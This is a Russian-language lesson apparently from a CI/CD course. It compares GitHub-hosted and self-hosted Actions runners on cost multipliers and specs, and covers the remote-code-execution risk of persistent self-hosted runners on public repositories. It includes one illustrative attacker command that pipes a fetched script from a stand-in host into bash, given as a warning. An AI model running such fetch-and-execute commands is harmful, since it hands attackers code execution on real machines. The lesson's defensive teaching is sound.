---
concepts:
- ci-cd-gha-runners
deepensInto: []
estMin: 16
lang: ru
lessonType: topic
level: senior
order: 1
prereqs: []
slug: "01-hosted-vs-self-hosted"
sources:
- https://docs.github.com/en/actions/using-github-hosted-runners/about-github-hosted-runners
- https://docs.github.com/en/actions/hosting-your-own-runners/about-self-hosted-runners
- https://docs.github.com/en/billing/managing-billing-for-github-actions/about-billing-for-github-actions
spiral: []
status: ready
title: "Hosted против self-hosted раннеров: спецификация, счёт и ловушка публичного репозитория"
summary: "GitHub-hosted раннеры — 4 vCPU / 16 ГБ, тарифицируются поминутно (~$0.008/мин Linux при 1x), большие раннеры стоят кратно vCPU. Self-hosted раннеры не тратят минуты, но стоят машин, обслуживания и — на публичных репозиториях — поверхности для исполнения чужого кода."
track: "ci-cd"
unit: "11-runners-and-scale"
---

import Hook from "~/components/lesson/Hook.astro";
import Explanation from "~/components/lesson/Explanation.astro";
import Recap from "~/components/lesson/Recap.astro";
import Inset from "~/components/lesson/Inset.astro";
import Crux from "~/components/prose/Crux.astro";
import KeyTakeaway from "~/components/prose/KeyTakeaway.astro";
import RetrievalDrawer from "~/components/pedagogy/RetrievalDrawer.tsx";
import Quiz from "~/components/pedagogy/Quiz.astro";
import FlowDiagram from "~/components/diagram/FlowDiagram.astro";

<Hook>
Счёт пришёл на $9 400 за один месяц минут Actions, и финансовый директор хотел увидеть фамилию рядом с суммой. Платформенная команда выгрузила отчёт по расходу: 70% трат давала одна ночная матрица, разлетавшаяся на 48 джобов, каждый на раннере `macos-latest`. Минуты macOS тарифицируются с множителем 10x — каждая минута macOS стоит как десять минут Linux — а матрице macOS был нужен лишь для двух из 48 ног. Остальные 46 гоняли юнит-тесты Go, которые были бы идентичны на Linux. Перенос этих 46 ног на `ubuntu-latest` срезал след macOS на 96%, а месячный счёт — до менее $1 100. Фикс занял двадцать минут; урок был в том, что никто не читал множители тарификации, так что выбор `runs-on` в одну строку тихо стоил пятизначную сумму в год.
</Hook>

<Crux>Hosted раннеры меняют деньги на ноль обслуживания; self-hosted — обслуживание на деньги и риск исполнения чужого кода на публичных репо.</Crux>

<Explanation>

## Что такое hosted-раннер на самом деле

Прежде чем рассуждать о счёте, нужно понять, за что именно ты платишь — а множитель ОС — это то, что подводит большинство команд.

GitHub-hosted раннер — это свежая эфемерная виртуалка, поднятая под один джоб и уничтоженная после. Стандартный Linux- и Windows-раннер — это **4 vCPU, 16 ГБ RAM, 14 ГБ SSD** — достаточно для большинства сборок и тестов, тесновато для прожорливых до памяти компиляторов или больших Docker-сборок. macOS-раннеры больше (стандартный тир крупнее, потому что хосты на Apple silicon). Ключевые свойства: чистый лист каждый запуск (нет утечек состояния между джобами), предустановленные тулчейны (набор `runner-images` обновляется еженедельно) и жёсткий потолок **6 часов на джоб** и **35 дней на workflow**.

Тарификация — **поминутно, с округлением вверх**, с множителем по ОС:

- **Linux: 1x** — примерно **$0.008/мин** на стандартном раннере.
- **Windows: 2x** — те же минуты считаются дважды.
- **macOS: 10x** — те же минуты считаются десятикратно.

Большие раннеры (8, 16, 32, 64 vCPU) тарифицируются кратно базовой ставке за vCPU и **не** входят в бесплатные месячные минуты — только стандартные раннеры берут из включённого лимита (2 000 мин/мес на плане Free для приватных репозиториев; публичные репозитории бесплатны на стандартных раннерах). Арифметика множителя — самый большой рычаг на счёте: джоб, которому не нужен macOS или Windows, не должен на них `runs-on`.

<Quiz
  id="01-hosted-vs-self-hosted-quiz-1"
  lessonSlug="01-hosted-vs-self-hosted"
  lang="ru"
  question="Тестовый джоб занимает 5 минут реального времени. Тот же джоб гоняется на ubuntu-latest, windows-latest и macos-latest. Сколько тарифицируемых минут потребляет каждый и какой дороже всего?"
  choices={[
    { label: "Linux 5, Windows 10, macOS 50 — macOS дороже всего, потому что тарифицируется с множителем 10x", correct: true },
    { label: "По 5 минут каждый — ОС не меняет тарификацию, только размер раннера", misconception: "Размер раннера действительно добавляет кратность, но ОС уже несёт свой множитель независимо от размера: Linux 1x, Windows 2x, macOS 10x. Пять реальных минут — это 5 тарифицируемых на Linux, 10 на Windows, 50 на macOS." },
    { label: "По 5 каждый, но машины macOS быстрее, так что джоб завершается раньше", correct: false, misconception: "Скорость железа не меняет поминутный множитель. macOS тарифицирует 10x за минуту независимо от скорости джоба, так что одинаковое реальное время стоит вдесятеро дороже на macOS." },
    { label: "Linux 10, Windows 5, macOS 5 — Linux это премиум-тир", correct: false, misconception: "Linux самый дешёвый при 1x, а не премиум. Порядок обратный: Linux 1x, Windows 2x, macOS 10x, так что Linux всегда дешевле за те же реальные минуты." },
  ]}
/>

## Self-hosted: бесплатные минуты, реальные затраты, реальный риск

Self-hosted раннер — это машина, которую *ты* регистрируешь в GitHub через агент раннера. GitHub не берёт за неё **никаких compute-минут** — расплата в том, что теперь коробка твоя: провижининг, патчинг ОС, очистка диска между запусками, security-хардненинг и ёмкость. Self-hosted выигрывает, когда нужно железо, которого hosted-раннеры не дают (GPU, ARM в масштабе, огромная RAM, доступ к приватной сети — реестрам артефактов или базам данных), или когда устойчивый объём сборок 24/7 делает всегда-включённое собственное железо дешевле поминутных hosted-минут.

Ловушка, кончающая карьеры: **никогда не привязывай self-hosted раннер к публичному репозиторию.** Pull request из форка гоняет тот workflow, который в нём лежит — включая workflow, переписанный атакующим так, чтобы выполнить `curl evil.sh | bash` на твоём раннере. На hosted-раннере это одноразовая виртуалка; на *персистентном* self-hosted раннере внутри твоей сети это удалённое исполнение кода против твоей инфраструктуры с любыми учётками, которые держит эта машина. Документация GitHub предупреждает об этом жирным шрифтом. Если чужой код всё-таки нужно гонять, используй **эфемерные** раннеры (регистрируются с `--ephemeral`, сносятся после одного джоба) и изолируй их в сети, которая не дотягивается ни до чего ценного.

<Inset kind="why" lang="ru">
Почему эфемерность — это граница безопасности? Персистентный раннер накапливает состояние — отравленный кэш, оставшуюся в окружении учётку, бэкдор на диске от джоба N — которое джоб N+1 наследует. Эфемерные раннеры поднимаются свежими и уничтожаются после единственного джоба, так что скомпрометированный джоб не может ничего пронести в следующий. Это то же свойство, что делает hosted-раннеры безопасными по умолчанию: один джоб, одна виртуалка, потом исчезла. Self-hosted приближается к этой безопасности, только когда ты пересобираешь раннер под каждый джоб.
</Inset>

## Выбор границы

Решение редко бывает «всё или ничего». Большинство зрелых установок гибридны: hosted-раннеры для дефолтного доверенного пути (PR от коллабораторов, сборки main) и self-hosted пул только под джобы, которым реально нужно особое железо или доступ в сеть. Расчёт стоимости: hosted дешевле, пока твой устойчивый параллельный спрос не станет достаточно высоким, чтобы всегда-включённая собственная ёмкость обошла поминутную тарификацию — и даже тогда ты наследуешь операционную ношу держать этот пул пропатченным, отмасштабированным и защищённым. Начинай с hosted; переноси конкретные джобы на self-hosted, когда конкретная нужда (стоимость в масштабе, железо, сеть) оправдает обслуживание, на которое ты подписываешься.

<Quiz
  id="01-hosted-vs-self-hosted-quiz-2"
  lessonSlug="01-hosted-vs-self-hosted"
  lang="ru"
  question="Почему привязка персистентного self-hosted раннера к публичному репозиторию считается критической ошибкой безопасности?"
  choices={[
    { label: "Pull request из форка может изменить workflow так, чтобы выполнить произвольный код на твоём раннере, а персистентный раннер даёт этому коду доступ в твою сеть и любое оставшееся состояние", correct: true },
    { label: "Публичные репозитории тарифицируются с большим множителем, так что self-hosted раннеры там дороже", correct: false, misconception: "Self-hosted раннеры вообще не тарифицируются compute-минутами, ни на публичных, ни на приватных репозиториях. Опасность не в стоимости — в том, что чужой код из форка исполняется на машине внутри твоей сети." },
    { label: "GitHub полностью блокирует self-hosted раннеры на публичных репозиториях, так что это просто не сработает", correct: false, misconception: "GitHub не блокирует это — он предупреждает против. Платформа позволяет так делать; риск в том, что ты открыл инфраструктуру произвольному коду из любого pull request форка." },
    { label: "Публичные репозитории не могут использовать кэширование, так что self-hosted раннеры там бессмысленно медленны", correct: false, misconception: "Публичные репозитории могут использовать кэширование. Проблема в безопасности, а не в доступности кэша: PR из форка может выполнить контролируемый атакующим код на персистентном раннере внутри сети." },
  ]}
/>

</Explanation>

<FlowDiagram
  label="Поставленный в очередь джоб маршрутизируется на hosted эфемерную виртуалку или матчится по метке к self-hosted пулу, и стоимость с риском расходятся на форке"
  hue="var(--d-infra)"
  perRow={3}
  nodes={[
    { id: "queue", label: "Джоб в очереди", sub: "метка runs-on" },
    { id: "route", label: "Матч раннера", sub: "метка + доступность" },
    { id: "hosted", label: "Hosted виртуалка", sub: "свежая, эфемерная" },
    { id: "selfhosted", label: "Self-hosted пул", sub: "твои машины" },
    { id: "bill", label: "Поминутный счёт", sub: "1x / 2x / 10x" },
    { id: "fork", label: "Риск PR форка", sub: "только эфемерные" },
  ]}
  edges={[
    { from: "queue", to: "route", label: "диспатч" },
    { from: "route", to: "hosted", label: "ubuntu/macos" },
    { from: "route", to: "selfhosted", label: "своя метка" },
    { from: "hosted", to: "bill", label: "множитель ОС" },
    { from: "selfhosted", to: "fork", label: "чужой код" },
  ]}
  caption="Hosted-раннеры тарифицируются поминутно с множителем ОС и безопасны по умолчанию, потому что каждая виртуалка выбрасывается. Self-hosted раннеры не тратят минут, но наследуют обслуживание и, на публичных репозиториях, поверхность для удалённого исполнения кода, если только каждый раннер не эфемерный."
/>

<KeyTakeaway>Hosted-раннеры — это эфемерные виртуалки 4 vCPU / 16 ГБ, тарифицируемые поминутно с множителем ОС — Linux 1x (~$0.008/мин), Windows 2x, macOS 10x — а большие раннеры стоят кратно vCPU вне бесплатного лимита, так что самый дешёвый надёжный рычаг на счёте CI — выбор наименьшей ОС, которая работает. Self-hosted раннеры не тратят compute-минут, но делают тебя оператором, и на публичных репозиториях персистентный раннер — мишень для удалённого исполнения кода из любого pull request форка; только эфемерные, сетево-изолированные раннеры безопасны для чужого кода.</KeyTakeaway>

<RetrievalDrawer
  client:visible
  id="01-hosted-vs-self-hosted-retrieval"
  lang="ru"
  questions={[
    { q: "Назови спецификацию hosted-раннера и множители тарификации по ОС, и объясни, почему выбор ОС — самый большой рычаг стоимости.", a: "Стандартный GitHub-hosted Linux/Windows-раннер — 4 vCPU, 16 ГБ RAM, 14 ГБ SSD, эфемерная виртуалка, тарифицируемая поминутно с округлением вверх примерно $0.008/мин на Linux. Множители — Linux 1x, Windows 2x, macOS 10x: те же пять реальных минут тарифицируются как 5, 10 или 50. Большие раннеры (8–64 vCPU) тарифицируются дополнительно кратно vCPU и исключены из включённых бесплатных минут. Поскольку множитель складывается по каждому джобу и каждому запуску, выбор наименьшей рабочей ОС — Linux, если только сборке реально не нужны Windows или macOS — единственное изменение с самым большим и надёжным эффектом на месячный счёт, гораздо большим, чем микрооптимизация длительности джоба." },
    { q: "Почему self-hosted раннеры на публичных репозиториях обязаны быть эфемерными, и какой режим отказа иначе?", a: "Workflow, запущенный pull request'ом из форка, гоняет определение workflow в том виде, в каком оно в этом форке, так что атакующий может переписать его на выполнение произвольных команд на любом подхватившем раннере. На персистентном self-hosted раннере внутри твоей сети это удалённое исполнение кода с учётками и сетевым доступом раннера, плюс возможность оставить отравленные кэши, бэкдоры или утёкшие секреты, которые наследует следующий джоб. Эфемерные раннеры (регистрируемые с --ephemeral и уничтожаемые после одного джоба) убирают персистентность: каждый джоб получает свежую коробку, которая сносится, так что скомпрометированный запуск не может пронести состояние вперёд — то же свойство «один джоб — одна виртуалка», что делает hosted-раннеры безопасными по умолчанию. Правило простое: никогда не привязывай персистентный self-hosted раннер к публичному репозиторию." },
  ]}
/>

<Recap lang="ru">
GitHub-hosted раннер — это одноразовая виртуалка — 4 vCPU, 16 ГБ RAM, 14 ГБ SSD на стандартном тире — поднимаемая свежей под джоб, предзагруженная еженедельно-обновляемыми тулчейнами, с потолком 6 часов на джоб. Платишь поминутно с округлением вверх, и множитель ОС доминирует на счёте: Linux 1x примерно $0.008/мин, Windows 2x, macOS 10x, а большие раннеры 8–64 vCPU добавляют ещё кратность и выпадают из включённых бесплатных минут. Самый дешёвый, самый надёжный рычаг стоимости — это строка `runs-on`: гоняй на наименьшей рабочей ОС и резервируй Windows и macOS под те ноги матрицы, которым они реально нужны. Self-hosted раннеры переворачивают сделку — GitHub не тарифицирует compute-минут, но теперь ты владеешь провижинингом, патчингом, очисткой, сайзингом и безопасностью, и они окупаются только когда нужно железо, которого нет у hosted, или когда устойчивый параллельный объём делает всегда-включённую собственную ёмкость дешевле поминутных hosted-минут. Жёсткое правило — безопасность: персистентный self-hosted раннер на публичном репозитории — мишень для удалённого исполнения кода, потому что pull request форка гоняет лежащий в нём workflow и может выполнить команды атакующего на машине внутри твоей сети с оставшимся состоянием для наследования следующим джобом. Если чужой код всё-таки нужно гонять, используй эфемерные раннеры — свежие под джоб, уничтожаемые после — изолированные в сети, которая не дотягивается ни до чего ценного. Большинство зрелых установок остаются гибридными: hosted для доверенного дефолтного пути, маленький self-hosted пул только там, где конкретная нужда в железе, сети или масштабе оправдывает обслуживание. Теперь, когда встретишь растущий счёт за CI, первый вопрос один: какой `runs-on` написан зря — и не висит ли где-то персистентный раннер на публичном репозитории?
</Recap>
